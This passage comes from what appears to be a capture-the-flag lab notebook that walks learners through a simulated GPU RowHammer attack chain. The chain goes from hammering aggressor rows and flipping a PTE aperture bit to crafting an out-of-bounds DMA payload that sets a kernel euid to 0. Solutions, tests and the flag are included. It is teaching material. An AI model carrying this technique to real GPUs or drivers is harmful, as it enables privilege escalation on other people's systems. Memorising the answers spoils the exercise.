neighbouring rows a little — charge leaks across word-line coupling.

**Double-sided hammering** opens both `victim - 1` and `victim + 1` in
rapid succession so leakage piles up on both sides of the victim.
Accumulated leakage past a per-cell threshold flips a bit.

The device refreshes every row within `tREFW` (32–64ms in GDDR6). If the
attacker can't reach the flip threshold inside that window, the leakage
is wiped.

<details>
<summary><b>Question 1.1a:</b> Why two aggressors instead of one?</summary>

Double-sided leaks charge into the victim from both sides every round;
effective leakage roughly doubles. This drops the required ACTIVATE count
by 2–5× on modern parts, from hundreds of millions (single-sided) to
~150k per aggressor (double-sided) on GDDR6. That is what makes the
attack practical inside a refresh window.
</details>

<details>
<summary><b>Question 1.1b:</b> What does the refresh window buy the defender, and why is it not enough?</summary>

It caps how long an attacker has to accumulate ACTIVATEs. In practice
150k activations × ~65ns per cycle ≈ 10–20ms of hammering, comfortably
inside a 32–64ms window — especially for adversarial code running on the
GPU itself, which can saturate the DRAM controller. Refreshing faster
costs bandwidth and still only moves the bar.
</details>

<details>
<summary><b>Vocabulary: tREFI vs tREFW</b></summary>

- **tREFI** (~1.9µs on GDDR6) — interval between REFRESH commands.
- **tREFW** (32–64ms) — the time in which every row gets refreshed at
  least once.

When this lab says "64ms refresh window" it means tREFW.
</details>
"""

# %%
"""
### Exercise 1.2: GPU PTEs and the aperture bit

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

The GPU has its own MMU (memory management unit - translates virtual memory addresses into physical memory locations) with 8-byte PTEs stored in VRAM. Each PTE holds:

* a **valid** bit,
* an **aperture** bit — 0 = page lives in GPU VRAM, 1 = page lives in
  host system memory (reached over PCIe),
* a physical frame number (PFN),
* permission / cache-control flags.

A single bit flip changes the *target memory space* of every subsequent
DMA through that virtual address.

<details>
<summary><b>Question 1.2a:</b> SECDED ECC (error correction mechanism) is on the DRAM. Why does that not stop this attack?</summary>

SECDED corrects 1-bit flips and detects 2-bit flips within a codeword.
GPUHammer shows that ECC-aware hammering patterns on A100/H100 drive two
flips per codeword, silently corrupting without raising a fault. The
attacker picks PTE locations whose paired flips line up with the hammer
template. ECC slows the attack down; it does not stop it.
</details>

<details>
<summary><b>Question 1.2b:</b> After the aperture flips, the PFN bits in the PTE are unchanged. Why does the attacker still end up writing to a <em>useful</em> CPU page?</summary>

Because they groomed host memory beforehand so that the PFN in the PTE
happens to match the driver's DMA-mapped page. Allocate + free cycles
until the kernel hands back the target PFN in a predictable position.
The coincidence is engineered, not luck. In this lab
`make_environment()` bakes it in.
</details>
"""

# %%
"""
### Exercise 1.3: Why the IOMMU does not block this write

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

The IOMMU (Intel VT-d / AMD-Vi) enforces **page-granular** DMA isolation:
"this device may read/write this host physical page." It does not look
inside the page.

On the GPUBreach DMA the transaction comes from the GPU's PCIe BDF and
targets the driver's DMA-mapped page — legitimately mapped for that
device. The IOMMU signs off.

<details>
<summary><b>Question 1.3a:</b> What granularity does the IOMMU enforce, and why does that leave the OOB write unblocked?</summary>

Page-level (4KB). It asks "is this page mapped for this device?" It does
not ask "is the write staying inside a sub-page software buffer?"
Enforcing sub-page bounds is the kernel's job — the driver's, in this
case — and that check is missing.
</details>

<details>
<summary><b>Question 1.3b:</b> Would ATS / PASID change this?</summary>

Not here. Both add context to IOMMU translations but still operate at
page granularity. They can narrow *which* pages a device may touch but
not enforce intra-page bounds inside a legitimately mapped page.
</details>
"""

# %%
"""
### Exercise 1.4: Driver OOB → privilege escalation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

The last link is a classic heap-adjacent out-of-bounds write. The
driver's DMA fast path copies caller-controlled `len(data)` bytes into
the DMA buffer at offset 0. It does not clamp `len(data)` to the
buffer's declared size. Immediately after the buffer, in the same page,
sits a kernel credential struct. Writing 0 into its `euid` gives the
caller root.

<details>
<summary><b>Question 1.4a:</b> Which CWE best captures the driver bug?</summary>

**CWE-787: Out-of-bounds Write.** The write stays inside the allocated
page (IOMMU satisfied) but passes the software-defined end of the
buffer. Secondary fits: CWE-20 (missing input validation), CWE-119
(improper restriction of operations within buffer bounds).
</details>

<details>
<summary><b>Question 1.4b:</b> Which kernel memory-safety mitigations <em>would</em> catch this, and which would not?</summary>

**Catch it**: KASAN (redzones around allocations), a kernel rewritten in
Rust if the write goes through a bounds-checked slice, SLAB hardening
that moves the cred struct elsewhere.

**Don't catch it**: IOMMU (too coarse), stack canaries (no stack frame),
W^X / NX (data-only corruption), CFI / shadow stacks (no indirect call
redirection), SMEP / SMAP (protect against *CPU* user→kernel mistakes,
not PCIe DMA).
</details>
"""

# %%
"""
## 2️⃣ Phase 2 — Must-finish: driving the attack to root

Five tiny coding exercises — one for each step in the chain. Each has a
test you run immediately after. Budget ~30–45 minutes total. At the end,
`env.check_all()` prints the flag.

| # | Step | What you write |
|---|------|----------------|
| 2.1 | Pick the right DRAM rows to hammer | `find_aggressors(victim_row)` |
| 2.2 | Hammer until a bit flips | `hammer_until_flip(dram, a, b, row)` |
| 2.3 | Make the GPU MMU pick up the flip | `trigger_pte_refresh(env)` |
| 2.4 | Build an oversized DMA payload | `craft_overflow_payload(euid=0)` |
| 2.5 | Fire the DMA and confirm root | `escalate_privileges(env, payload)` |

**Expected output when Phase 2 succeeds.** After running every cell
through to `env.check_all()`, your terminal should look like this (exact
numbers for rounds/ns will match on every machine because the flip row
is deterministic):

```text
Ex 2.1: aggressors for PTE_ROW=4242 → 4241, 4243
  Aggressor geometry correct!
Ex 2.2: flipped=True after 150,000 rounds (19.50 ms)
  Hammer loop and cycle accounting correct!
Ex 2.3: aperture 0 → 1 (expected 0 → 1)
  PT resync propagated the flip!
Ex 2.4: payload=132 bytes (128 filler + 4 euid)
  Payload layout correct!
Ex 2.5: root achieved? True
  End-to-end escalation succeeded!
── GPUBreach attack chain ──
  ✓ Stage 1 — aggressor rows identified
  ✓ Stage 2 — flip landed inside the 64ms refresh window
  ✓ Stage 3 — aperture bit flipped in the live PTE
  ✓ Stage 4 — OOB DMA wrote euid=0 into the cred struct

  🎉 All stages succeeded — root achieved.
  FLAG{gpubreach_rowhammer_aperture_oob_root}
```

If Phase 2 is taking **minutes** instead of **milliseconds**, you almost
certainly have a `|a - b| ≠ 2` bug in `find_aggressors` — double-check
Exercise 2.1 before anything else.
"""

# %%
"""
### Exercise 2.1: Aggressor rows for double-sided hammering

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Given the row that holds the target PTE, return the two aggressor rows
that sandwich it. `DRAM.hammer_once(agg_a, agg_b)` only leaks into the
victim row when `|agg_a - agg_b| == 2` with the victim between them.
"""

def find_aggressors(victim_row: int) -> tuple[int, int]:
    """Return the two aggressor rows for double-sided hammering."""
    if "SOLUTION":
        if victim_row == 0:
            return (0, 2)
        elif victim_row >= ROWS_PER_BANK - 1:
            return (victim_row - 2, victim_row - 1)
        else:
            return (victim_row - 1, victim_row + 1)
    else:
        # TODO: Return (aggressor_a, aggressor_b) such that victim_row is between them
        # and |aggressor_a - aggressor_b| == 2
        return (0, 0)


agg_a, agg_b = find_aggressors(PTE_ROW)
print(f"Ex 2.1: aggressors for PTE_ROW={PTE_ROW} → {agg_a}, {agg_b}")


@report
def test_find_aggressors(solution: Callable[[int], tuple[int, int]]):
    for victim in [PTE_ROW, 100, 7777, 42]:
        a, b = solution(victim)
        assert abs(a - b) == 2, (
            f"aggressors for victim={victim} must differ by 2, got ({a}, {b})"
        )
        assert (a + b) // 2 == victim, (
            f"victim={victim} must lie between aggressors, midpoint was "
            f"{(a + b) // 2}"
        )
    print("  Aggressor geometry correct!")


test_find_aggressors(find_aggressors)

env.stage1_aggressors_ok = True

# %%
"""
### Exercise 2.2: Hammer until a bit flips

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

Drive the hammer loop. Call `dram.hammer_once(agg_a, agg_b)` repeatedly
until `dram.has_flipped(victim_row)` becomes True. Return a dict with
keys "flipped", "rounds", "total_ns".
"""

def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_rounds: int = 2_000_000) -> dict:
    """Drive the DRAM into a RowHammer flip on ``victim_row``."""
    if "SOLUTION":
        total_ns = 0
        rounds = 0
        while not dram.has_flipped(victim_row) and rounds < max_rounds:
            round_ns = dram.hammer_once(agg_a, agg_b)
            total_ns += round_ns
            rounds += 1
        return {
            "flipped": dram.has_flipped(victim_row),
            "rounds": rounds,
            "total_ns": total_ns
        }
    else:
        # TODO:
        # 1. Initialise total_ns and rounds counters.
        # 2. While `dram.has_flipped(victim_row)` is False (and you are
        #    below `max_rounds`):
        #      - call dram.hammer_once(aggressor_a, aggressor_b)
        #      - add its return value (nanoseconds) to total_ns
        #      - increment rounds
        # 3. Return {"rounds": rounds, "total_ns": total_ns,
        #            "flipped": dram.has_flipped(victim_row)}
        return {"rounds": 0, "total_ns": 0, "flipped": False}


flip_run = hammer_until_flip(env.dram, agg_a, agg_b, PTE_ROW)
print(
    f"Ex 2.2: flipped={flip_run['flipped']} after "
    f"{flip_run['rounds']:,} rounds "
    f"({flip_run['total_ns'] / 1_000_000:.2f} ms)"
)


@report
def test_hammer_until_flip(solution: Callable[..., dict]):
    fresh = make_environment()
    victim = fresh.dram.flip_location[0]
    a, b = victim - 1, victim + 1
    res = solution(fresh.dram, a, b, victim)
    assert res["flipped"], f"expected a flip to land, got {res}"
    assert res["rounds"] >= HAMMER_THRESHOLD_ACTIVATIONS, (
        f"expected at least {HAMMER_THRESHOLD_ACTIVATIONS:,} rounds, "
        f"got {res['rounds']:,}"
    )
    expected_ns = res["rounds"] * 2 * ACTIVATE_PRECHARGE_NS
    assert res["total_ns"] == expected_ns, (
        f"total_ns must accumulate hammer_once return; "
        f"expected {expected_ns}, got {res['total_ns']}"
    )
    # Using a non-double-sided pair must not flip anything.
    other = make_environment()
    no_flip = solution(other.dram, 0, 5, other.dram.flip_location[0], max_rounds=1000)
    assert not no_flip["flipped"], (
        "hammer_until_flip must stop at max_rounds if aggressors are wrong"
    )
    print("  Hammer loop and cycle accounting correct!")


test_hammer_until_flip(hammer_until_flip)

env.stage2_flipped_in_refresh_window = (
    flip_run["flipped"]
    and flip_run["total_ns"] / 1_000_000 < REFRESH_WINDOW_MS
)

# %%
"""
### Exercise 2.3: Force the MMU to re-walk the flipped PTE

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

The DRAM bit is flipped, but the GPU MMU's cached copy still says
"aperture = GPU VRAM". Call `page_table.sync_from_dram(env.dram)` to
re-read the PTE bytes from DRAM, then return the `(before, after)` pair
of aperture values.

A real attacker triggers this re-walk with a GPU context switch, an
explicit TLB flush from the driver, or simply by waiting for the cache
line to be evicted.
"""


def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
    """Resync the PT from DRAM. Return (before_aperture, after_aperture)."""
    if "SOLUTION":
        before = env.page_table.cached_pte.aperture
        env.page_table.sync_from_dram(env.dram)
        after = env.page_table.cached_pte.aperture
        return (before, after)
    else:
        # TODO: Capture before value, call sync_from_dram, capture after value
        return (0, 0)


before, after = trigger_pte_refresh(env)
print(f"Ex 2.3: aperture {before} → {after} (expected 0 → 1)")


@report
def test_trigger_pte_refresh(solution: Callable[[Environment], tuple[int, int]]):
    fresh = make_environment()
    # Hammer it directly (so we test *only* the refresh step in isolation).
    v = fresh.dram.flip_location[0]
    while not fresh.dram.has_flipped(v):
        fresh.dram.hammer_once(v - 1, v + 1)
    assert fresh.page_table.cached_pte.aperture == APERTURE_GPU_LOCAL, (
        "cached PTE must still be stale before sync_from_dram runs"
    )
    pair = solution(fresh)
    assert pair == (APERTURE_GPU_LOCAL, APERTURE_SYSTEM), (
        f"expected (0, 1), got {pair}"
    )
    assert fresh.page_table.cached_pte.aperture == APERTURE_SYSTEM, (
        "after refresh, cached_pte must reflect APERTURE_SYSTEM"
    )
    print("  PT resync propagated the flip!")


test_trigger_pte_refresh(trigger_pte_refresh)

env.stage3_aperture_changed = (before, after) == (
    APERTURE_GPU_LOCAL,
    APERTURE_SYSTEM,
)

# %%
"""
### Exercise 2.4: Craft the OOB DMA payload

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

You need a byte string for the DMA payload such that:

1. Its length is exactly `DRIVER_BUFFER_SIZE + 4` bytes. The first
   `DRIVER_BUFFER_SIZE` bytes fill the driver buffer; the last 4 bytes
   overflow into the `euid` field of the cred struct.
2. The last 4 bytes encode the integer `0` (root's euid) as a 4-byte
   little-endian number — matching how `KernelCred.euid` is serialised.

You can put any content in the first `DRIVER_BUFFER_SIZE` bytes. The
convention is to use `b"A"` so the hexdump is easy to read.
"""


def craft_overflow_payload(new_euid: int = 0) -> bytes:
    """Return a DMA payload that overflows the driver buffer into euid."""
    if "SOLUTION":
        return b"A" * DRIVER_BUFFER_SIZE + new_euid.to_bytes(4, "little")
    else:
        # TODO:
        # 1. Fill `DRIVER_BUFFER_SIZE` bytes (e.g. b"A" repeated).
        # 2. Append the little-endian 4-byte encoding of `new_euid`.
        # 3. Return filler + euid_bytes.
        return b""


payload = craft_overflow_payload()
print(
    f"Ex 2.4: payload={len(payload)} bytes "
    f"({DRIVER_BUFFER_SIZE} filler + 4 euid)"
)


@report
def test_craft_overflow_payload(solution: Callable[..., bytes]):
    p = solution()
    assert isinstance(p, (bytes, bytearray)), (
        f"payload must be bytes, got {type(p).__name__}"
    )
    assert len(p) == DRIVER_BUFFER_SIZE + 4, (
        f"expected {DRIVER_BUFFER_SIZE + 4} bytes, got {len(p)}"
    )
    assert int.from_bytes(p[-4:], "little") == 0, (
        f"last 4 bytes should encode euid=0 little-endian, "
        f"got {p[-4:].hex()}"
    )
    # Parameterised euid should round-trip.
    p2 = solution(42)
    assert int.from_bytes(p2[-4:], "little") == 42, (
        f"parameterised new_euid should be respected, got {p2[-4:].hex()}"
    )
    print("  Payload layout correct!")


test_craft_overflow_payload(craft_overflow_payload)

# %%
"""
### Exercise 2.5: Fire the DMA and confirm root

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

Hand the payload to `perform_gpu_dma`. The simulator resolves the PTE,
validates the transaction with the IOMMU (which approves — the page is
mapped), and writes the payload into the driver page. The overflow lands
on the cred struct and `env.kernel_cred.is_root()` flips to True.

Call `perform_gpu_dma` with the positional arguments
`(payload, VICTIM_GPU_VADDR, env.page_table, env.iommu, env.dram,
env.driver_page)`, then return `env.kernel_cred.is_root()`.
"""


def escalate_privileges(env: Environment, payload: bytes) -> bool:
    """Perform the DMA. Return True iff the cred struct now shows root."""
    if "SOLUTION":
        perform_gpu_dma(payload, VICTIM_GPU_VADDR, env.page_table,
                       env.iommu, env.dram, env.driver_page)
        return env.kernel_cred.is_root()
    else:
        # TODO:
        # 1. Call perform_gpu_dma(payload, VICTIM_GPU_VADDR,
        #    env.page_table, env.iommu, env.dram, env.driver_page).
        # 2. Return env.kernel_cred.is_root().
        return False


rooted = escalate_privileges(env, payload)
print(f"Ex 2.5: root achieved? {rooted}")


@report
def test_escalate_privileges(solution: Callable[..., bool]):
    # Build a fresh chain-completed env (DRAM flipped + PT resynced)
    # so the solution is exercised in isolation.
    fresh = make_environment()
    v = fresh.dram.flip_location[0]
    while not fresh.dram.has_flipped(v):
        fresh.dram.hammer_once(v - 1, v + 1)
    fresh.page_table.sync_from_dram(fresh.dram)
    # Build an overflow payload directly so the test is independent of
    # Exercise 2.4 still being defined in the caller's namespace.
    overflow_payload = b"A" * DRIVER_BUFFER_SIZE + (0).to_bytes(4, "little")
    assert not fresh.kernel_cred.is_root(), (
        "sanity: cred must start non-root"
    )
    ok = solution(fresh, overflow_payload)
    assert ok is True, "escalate_privileges should return True on success"
    assert fresh.kernel_cred.is_root(), (
        "kernel_cred.euid should be 0 after the OOB write"
    )
    # Test idempotency-ish: a payload that does NOT overflow must not root.
    fresh2 = make_environment()
    while not fresh2.dram.has_flipped(v):
        fresh2.dram.hammer_once(v - 1, v + 1)
    fresh2.page_table.sync_from_dram(fresh2.dram)
    tiny = b"A" * (DRIVER_BUFFER_SIZE - 1)  # no overflow
    ok2 = solution(fresh2, tiny)
    assert ok2 is False, (
        "a payload shorter than DRIVER_BUFFER_SIZE must NOT escalate"
    )
    print("  End-to-end escalation succeeded!")


test_escalate_privileges(escalate_privileges)

env.stage4_root_obtained = rooted

# %%
"""
### Print the flag

If every stage above succeeded, `env.check_all()` prints the flag.
Otherwise it tells you which stage still needs work.
"""

env.check_all()

# %%
"""
## 3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)

Optional exercises for deeper understanding. Each is short and independent.

### Exercise 3.1 (Optional): Decode a PTE by hand

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Prove you understand the PTE byte layout by parsing an 8-byte PTE into a
dict of the form `{"valid": bool, "aperture": int, "physical_frame": int}`
without using `gpubreach_sim.pte.decode_pte`.

Recall the layout (from the PTE module docstring):

* byte 0: flags (bit 0 = valid, bit 1 = aperture, bits 2–7 reserved)
* bytes 1–6: 48-bit little-endian physical frame number
* byte 7: reserved
"""

def decode_pte_manually(raw: bytes) -> dict:
    """Hand-decoded PTE — do not call gpubreach_sim.decode_pte."""
    if "SOLUTION":
        assert len(raw) == PTE_BYTES
        flags = raw[0]
        return {
            "valid": bool(flags & 1),
            "aperture": (flags >> APERTURE_BIT_POS) & 1,
            "physical_frame": int.from_bytes(raw[1:7], "little"),
        }
    else:
        # TODO: pick apart raw[0], raw[1:7], bit by bit.
        return {"valid": False, "aperture": 0, "physical_frame": 0}


# A sample PTE: valid=1, aperture=1, PFN=0xABCDEF
sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
print(f"Ex 3.1: decoded = {decode_pte_manually(sample)}")


@report
def test_decode_pte_manually(solution: Callable[[bytes], dict]):
    sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
    got = solution(sample)
    assert got["valid"] is True, f"'valid' should be True, got {got['valid']}"
    assert got["aperture"] == 1, f"'aperture' should be 1, got {got['aperture']}"
    assert got["physical_frame"] == 0xABCDEF, (
        f"'physical_frame' should be 0xABCDEF, got {got['physical_frame']:#x}"
    )
    # aperture=0, valid=1 case
    other = bytes([0b0000_0001]) + (1).to_bytes(6, "little") + b"\x00"
    got2 = solution(other)
    assert got2 == {"valid": True, "aperture": 0, "physical_frame": 1}
    # invalid
    inv = bytes(8)
    got3 = solution(inv)
    assert got3["valid"] is False, "all-zero PTE must be invalid"
    print("  Hand-decoded PTE matches the simulator's decode!")


test_decode_pte_manually(decode_pte_manually)


# %%
"""
### Exercise 3.2 (Optional): Inspect the exact flipped bit

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Compare the PTE's raw bytes in DRAM before and after the RowHammer flip
and return the set of (byte_offset, bit_position) pairs that changed.
There should be exactly one.

You may use `env.dram.read(row, offset, length)` to grab bytes, and
you'll need a fresh environment so the "before" snapshot is pristine.
"""


def find_flipped_bits(before: bytes, after: bytes) -> set[tuple[int, int]]:
    """Return {(byte_index, bit_position), ...} where before != after."""
    if "SOLUTION":
        flips: set[tuple[int, int]] = set()
        for i, (b, a) in enumerate(zip(before, after)):
            diff = b ^ a
            for bit in range(8):
                if (diff >> bit) & 1:
                    flips.add((i, bit))
        return flips
    else:
        # TODO: iterate over pairs of bytes, XOR them, and record each
        # differing bit as (byte_index, bit_position).
        return set()


fresh3 = make_environment()
pre = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
while not fresh3.dram.has_flipped(PTE_ROW):
    fresh3.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
post = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
print(f"Ex 3.2: flipped bits = {find_flipped_bits(pre, post)}")


@report
def test_find_flipped_bits(solution: Callable[[bytes, bytes], set]):
    fresh = make_environment()
    pre = fresh.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
    while not fresh.dram.has_flipped(PTE_ROW):
        fresh.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
    post = fresh.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
    flips = solution(pre, post)
    assert flips == {(0, APERTURE_BIT_POS)}, (
        f"expected exactly the aperture bit to flip, got {flips}"
    )
    # Sanity: identical byte strings → no flips.
    assert solution(b"\x00\x01\x02", b"\x00\x01\x02") == set()
    # Sanity: two byte differences → two (or more) flips.
    assert len(solution(b"\x00\x00", b"\xff\xff")) == 16
    print("  Exactly one flip, at the aperture bit — as templated!")


test_find_flipped_bits(find_flipped_bits)


# %%
"""
### Exercise 3.3 (Optional): Budget the hammer against the refresh window

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Before hammering, you'd want to know: will we even finish the activations
inside the refresh window? Compute:

1. The minimum number of hammer *rounds* to cross the flip threshold.
   Each round hits both aggressors, so each round adds one activation
   per aggressor.
2. The simulated nanoseconds those rounds will cost. Each round costs
   `2 * ACTIVATE_PRECHARGE_NS`.
3. Whether that total time fits inside the refresh window.

Return a dict with keys `"rounds"`, `"total_ns"`, `"total_ms"`,
`"fits_refresh_window"`.
"""

def hammer_budget(threshold: int = HAMMER_THRESHOLD_ACTIVATIONS, tRC_ns: int = ACTIVATE_PRECHARGE_NS, refresh_ms: int = REFRESH_WINDOW_MS) -> dict:
    """Compute worst-case hammering cost."""
    if "SOLUTION":
        rounds = threshold  # one activation per aggressor per round
        total_ns = rounds * 2 * tRC_ns
        total_ms = total_ns / 1_000_000
        return {
            "rounds": rounds,
            "total_ns": total_ns,
            "total_ms": total_ms,
            "fits_refresh_window": total_ms < refresh_ms,
        }
    else:
        return {"rounds": 0, "total_ns": 0, "total_ms": 0.0, "fits_refresh_window": False}
    



budget = hammer_budget()
print(
    f"Ex 3.3: {budget['rounds']:,} rounds × {2 * ACTIVATE_PRECHARGE_NS} ns "
    f"= {budget['total_ms']:.2f} ms "
    f"(fits 64ms window: {budget['fits_refresh_window']})"
)


@report
def test_hammer_budget(solution: Callable[..., dict]):
    res = solution()
    assert res["rounds"] == HAMMER_THRESHOLD_ACTIVATIONS, (
        f"expected {HAMMER_THRESHOLD_ACTIVATIONS} rounds, got {res['rounds']}"
    )
    expected_ns = HAMMER_THRESHOLD_ACTIVATIONS * 2 * ACTIVATE_PRECHARGE_NS
    assert res["total_ns"] == expected_ns, (
        f"expected total_ns={expected_ns}, got {res['total_ns']}"
    )
    assert abs(res["total_ms"] - expected_ns / 1_000_000) < 1e-9, (
        f"total_ms should be total_ns / 1e6, got {res['total_ms']}"
    )
    assert res["fits_refresh_window"] is True, (
        f"with these parameters the budget should fit {REFRESH_WINDOW_MS} ms, "
        f"got fits_refresh_window={res['fits_refresh_window']}"
    )
    # Sanity: with a 1-ms refresh window it must NOT fit.
    tight = solution(refresh_ms=1)
    assert tight["fits_refresh_window"] is False, (
        "fits_refresh_window must respect the refresh_ms parameter"
    )
    print("  Budget arithmetic correct!")


test_hammer_budget(hammer_budget)

# %%
"""
### Exercise 3.4 (Optional): Maximum hammer rounds inside the window

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Flip the budget question around: given the refresh window, how *many*
rounds could the attacker fit at most? Compare it to
`HAMMER_THRESHOLD_ACTIVATIONS` — how comfortably do we fit?
"""

def max_rounds_in_window(refresh_ms: int = REFRESH_WINDOW_MS, tRC_ns: int = ACTIVATE_PRECHARGE_NS) -> int:
    """Maximum rounds that fit in refresh window."""
    if "SOLUTION":
        per_round = 2 * tRC_ns
        budget_ns = refresh_ms * 1_000_000
        return budget_ns // per_round
    else:
        return 0


max_rounds = max_rounds_in_window()
headroom = max_rounds / HAMMER_THRESHOLD_ACTIVATIONS
print(
    f"Ex 3.4: up to {max_rounds:,} rounds fit in {REFRESH_WINDOW_MS} ms "
    f"→ {headroom:.1f}× threshold headroom"
)


@report
def test_max_rounds_in_window(solution: Callable[..., int]):
    got = solution()
    expected = (REFRESH_WINDOW_MS * 1_000_000) // (2 * ACTIVATE_PRECHARGE_NS)
    assert got == expected, f"expected {expected}, got {got}"
    # With a 1ms window the budget must shrink by ~64×.
    short = solution(refresh_ms=1)
    assert short == 1_000_000 // (2 * ACTIVATE_PRECHARGE_NS), (
        f"parameterised window ignored, got {short}"
    )
    # Headroom must be > 1× or the lab wouldn't work.
    assert got > HAMMER_THRESHOLD_ACTIVATIONS, (
        f"budget {got} must exceed threshold {HAMMER_THRESHOLD_ACTIVATIONS}"
    )
    print("  Budget arithmetic and parameterisation both correct!")


test_max_rounds_in_window(max_rounds_in_window)


# %%
"""
### Exercise 3.5 (Optional): The IOMMU blocks what it promises to block

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

Prove the IOMMU is doing its job — it *does* block writes to physical
pages it has not mapped for the GPU. Use `env.iommu.validate(page, offset,
length)` to confirm:

1. Writes to `env.driver_page` at offset 0 with length `PAGE_SIZE` are
   allowed.
2. Writes to `env.driver_page` at offset 0 with length `PAGE_SIZE + 1`
   are rejected (cross a page boundary).
3. Writes to a *different* `DriverPage` instance are rejected (not
   mapped).

Return a dict with three booleans: `"intra_page_ok"`, `"overflow_page"`,
`"other_page"`.
"""


def probe_iommu(env: Environment) -> dict:
    """Probe IOMMU enforcement."""
    if "SOLUTION":
        from gpubreach_sim.dma import DriverPage
        return {
            "intra_page_ok": env.iommu.validate(env.driver_page, 0, PAGE_SIZE),
            "overflow_page": env.iommu.validate(env.driver_page, 0, PAGE_SIZE + 1),
            "other_page": env.iommu.validate(DriverPage(), 0, 64),
        }
    else:
        return {"intra_page_ok": False, "overflow_page": False, "other_page": False}


probe = probe_iommu(env)
print(f"Ex 3.5: IOMMU probe = {probe}")


@report
def test_probe_iommu(solution: Callable[[Environment], dict]):
    # Use a fresh environment so the test does not depend on a module-level
    # ``env`` that the answer file may or may not still have around.
    fresh = make_environment()
    got = solution(fresh)
    assert got["intra_page_ok"] is True, (
        "IOMMU should allow a full-page write to the mapped driver page"
    )
    assert got["overflow_page"] is False, (
        "IOMMU must reject writes that cross the page boundary"
    )
    assert got["other_page"] is False, (
        "IOMMU must reject writes to a page it hasn't mapped for this device"
    )
    print("  IOMMU enforces what it promises — and no more!")


test_probe_iommu(probe_iommu)

# %%
"""
### Exercise 3.6 (Optional): Measure the OOB overflow precisely

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Given a DMA payload length, how many bytes overflow past the driver
buffer into adjacent kernel memory? Return 0 if no overflow.
"""


def overflow_bytes(payload_len: int) -> int:
    """Bytes that overflow past DRIVER_BUFFER_SIZE."""
    if "SOLUTION":
        return max(0, payload_len - DRIVER_BUFFER_SIZE)
    else:
        return 0


for n in [0, DRIVER_BUFFER_SIZE - 1, DRIVER_BUFFER_SIZE, DRIVER_BUFFER_SIZE + 4]:
    print(f"Ex 3.6: payload {n}B → overflow {overflow_bytes(n)}B")


@report
def test_overflow_bytes(solution: Callable[[int], int]):
    assert solution(0) == 0
    assert solution(DRIVER_BUFFER_SIZE) == 0
    assert solution(DRIVER_BUFFER_SIZE + 4) == 4
    assert solution(DRIVER_BUFFER_SIZE + 100) == 100
    assert solution(DRIVER_BUFFER_SIZE - 1) == 0  # underflow clamps to 0
    print("  Overflow arithmetic correct!")


test_overflow_bytes(overflow_bytes)
# %%
"""
### Exercise 3.7 (Optional): A tighter payload

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

The payload in Exercise 2.4 overshoots — it writes 132 bytes where 132 is
exactly `DRIVER_BUFFER_SIZE + 4`. What if the cred struct's euid field
isn't at the very start of the overflow region, but at some `offset`
past `CRED_OFFSET`? Write a parameterised payload builder.

The new signature:
`craft_precise_payload(cred_offset_in_page: int, new_euid: int) → bytes`

The payload should have length `cred_offset_in_page + 4` so that the last
4 bytes land exactly at `cred_offset_in_page` inside the driver page —
when the driver copies starting at `DRIVER_BUFFER_OFFSET = 0`.
"""

def craft_precise_payload(cred_offset_in_page: int, new_euid: int) -> bytes:
    """Precise payload targeting specific offset."""
    if "SOLUTION":
        assert cred_offset_in_page >= DRIVER_BUFFER_SIZE
        return b"A" * cred_offset_in_page + new_euid.to_bytes(4, "little")
    else:
        return b""



tight = craft_precise_payload(CRED_OFFSET, 0)
print(f"Ex 3.7: precise payload is {len(tight)} bytes")


@report
def test_craft_precise_payload(solution: Callable[[int, int], bytes]):
    # Using the simulator's real CRED_OFFSET must escalate.
    fresh = make_environment()
    v = fresh.dram.flip_location[0]
    while not fresh.dram.has_flipped(v):
        fresh.dram.hammer_once(v - 1, v + 1)
    fresh.page_table.sync_from_dram(fresh.dram)
    p = solution(CRED_OFFSET, 0)
    assert len(p) == CRED_OFFSET + 4, (
        f"expected {CRED_OFFSET + 4} bytes, got {len(p)}"
    )
    perform_gpu_dma(
        p,
        VICTIM_GPU_VADDR,
        fresh.page_table,
        fresh.iommu,
        fresh.dram,
        fresh.driver_page,
    )
    assert fresh.kernel_cred.is_root(), (
        "payload should have landed euid=0 at CRED_OFFSET"
    )
    # And it should respect non-zero euids, too.
    p2 = solution(CRED_OFFSET, 1337)
    assert int.from_bytes(p2[-4:], "little") == 1337
    print("  Precise payload placement correct!")


test_craft_precise_payload(craft_precise_payload)

# %%
# """
# ## 4️⃣ Phase 4 — Debrief (15 min discussion)

